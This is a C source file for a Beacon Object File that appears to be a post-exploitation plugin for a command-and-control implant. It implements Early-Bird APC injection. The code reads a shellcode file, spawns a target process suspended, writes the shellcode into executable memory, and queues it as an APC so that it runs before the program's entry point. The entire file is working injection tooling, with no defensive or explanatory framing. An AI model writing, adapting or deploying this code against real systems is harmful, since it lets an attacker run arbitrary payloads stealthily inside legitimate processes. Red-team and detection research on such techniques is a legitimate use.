/*
 * bof-earlybird <executable> <shellcode-file> [arguments]
 *
 * Early-bird APC injection: create the target process suspended, write the
 * shellcode into it, queue an APC to its (not yet running) main thread, then
 * resume.  The APC fires before the process entry point ever executes.
 */
#include "beacon.h"
#include "bofdefs.h"
#include "helpers.h"

void go(char *args, int alen)
{
    datap parser;
    char *exe, *path, *extra = "";
    int elen, plen, xlen;
    unsigned char *sc = NULL;
    unsigned int sclen = 0;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    LPVOID remote;

    BeaconDataParse(&parser, args, alen);
    exe   = BeaconDataExtract(&parser, &elen);
    path  = BeaconDataExtract(&parser, &plen);
    extra = BeaconDataExtract(&parser, &xlen);
    if (!exe || !exe[0] || !path || !path[0]) {
        BeaconPrintf(CALLBACK_ERROR,
                     "usage: earlybird <executable> <shellcode-file> [args]\n");
        return;
    }
    if (!extra) extra = "";

    /* EarlyBird needs to create the process; a PID is not a valid target. */
    {
        const char *p = exe;
        int numeric = (*p != 0);
        while (*p) {
            if (*p < '0' || *p > '9') { numeric = 0; break; }
            p++;
        }
        if (numeric) {
            BeaconPrintf(CALLBACK_ERROR,
                         "earlybird spawns a new process; '%s' looks like a PID\n",
                         exe);
            BeaconPrintf(CALLBACK_ERROR,
                         "usage: earlybird <executable> <shellcode-file> [args]\n");
            BeaconPrintf(CALLBACK_ERROR,
                         "for an existing process use: bof-injectapc <pid> <shellcode-file>\n");
            return;
        }
    }
    if (bof_read_file(path, &sc, &sclen) != 0) {
        bof_error_win32("read shellcode file", KERNEL32$GetLastError(),
                        "file must exist, be readable, and be 1 byte..256 MiB");
        bof_error_context("path", path);
        return;
    }

    bof_memzero(&si, sizeof(si));
    bof_memzero(&pi, sizeof(pi));
    si.cb = sizeof(si);

    {
        char cmdline[1024];
        bof_strncpy(cmdline, "\"", sizeof(cmdline));
        bof_strncat(cmdline, exe, sizeof(cmdline) - bof_strlen(cmdline) - 1);
        bof_strncat(cmdline, "\" ", sizeof(cmdline) - bof_strlen(cmdline) - 1);
        bof_strncat(cmdline, extra, sizeof(cmdline) - bof_strlen(cmdline) - 1);

        if (!KERNEL32$CreateProcessA(NULL, cmdline, NULL, NULL, FALSE,
                                     CREATE_SUSPENDED | CREATE_NO_WINDOW,
                                     NULL, NULL, &si, &pi)) {
            DWORD err = KERNEL32$GetLastError();
            bof_error_win32("CreateProcess", err,
                            err == ERROR_FILE_NOT_FOUND
                                ? "pass a full executable path (earlybird creates the process)"
                                : "could not create the suspended target process");
            bof_error_context("image", exe);
            KERNEL32$VirtualFree(sc, 0, MEM_RELEASE);
            return;
        }
    }

    remote = KERNEL32$VirtualAllocEx(pi.hProcess, NULL, (SIZE_T)sclen,
                                     MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remote) {
        DWORD err = KERNEL32$GetLastError();
        bof_error_win32("VirtualAllocEx", err,
                        "cannot reserve RXW memory in the target process");
        bof_error_num("pid", (unsigned long long)pi.dwProcessId);
        bof_error_num("size", (unsigned long long)sclen);
        KERNEL32$TerminateProcess(pi.hProcess, 1);
        KERNEL32$CloseHandle(pi.hThread);
        KERNEL32$CloseHandle(pi.hProcess);
        KERNEL32$VirtualFree(sc, 0, MEM_RELEASE);
        return;
    }

    if (!KERNEL32$WriteProcessMemory(pi.hProcess, remote, sc, (SIZE_T)sclen, NULL)) {
        DWORD err = KERNEL32$GetLastError();
        bof_error_win32("WriteProcessMemory", err,
                        "cannot copy the shellcode into the target process");
        bof_error_num("pid", (unsigned long long)pi.dwProcessId);
        bof_error_num("remote", (unsigned long long)(ULONG_PTR)remote);
        bof_error_num("size", (unsigned long long)sclen);
        KERNEL32$TerminateProcess(pi.hProcess, 1);
        KERNEL32$CloseHandle(pi.hThread);
        KERNEL32$CloseHandle(pi.hProcess);
        KERNEL32$VirtualFree(sc, 0, MEM_RELEASE);
        return;
    }

    if (!KERNEL32$QueueUserAPC((PAPCFUNC)remote, pi.hThread, 0)) {
        DWORD err = KERNEL32$GetLastError();
        bof_error_win32("QueueUserAPC", err,
                        "cannot queue the APC on the suspended main thread");
        bof_error_num("pid", (unsigned long long)pi.dwProcessId);
        bof_error_num("remote", (unsigned long long)(ULONG_PTR)remote);
        KERNEL32$TerminateProcess(pi.hProcess, 1);
    } else {
        DWORD resumed = KERNEL32$ResumeThread(pi.hThread);
        if (resumed == (DWORD)-1) {
            bof_error_win32("ResumeThread", KERNEL32$GetLastError(),
                            "APC queued but the target thread did not resume");
            bof_error_num("pid", (unsigned long long)pi.dwProcessId);
            KERNEL32$TerminateProcess(pi.hProcess, 1);
        } else {
            BeaconPrintf(CALLBACK_OUTPUT,
                         "[+] PID %lu spawned suspended, APC queued at 0x%p\n",
                         (unsigned long)pi.dwProcessId, remote);
        }
    }

    KERNEL32$CloseHandle(pi.hThread);
    KERNEL32$CloseHandle(pi.hProcess);
    KERNEL32$VirtualFree(sc, 0, MEM_RELEASE);
}
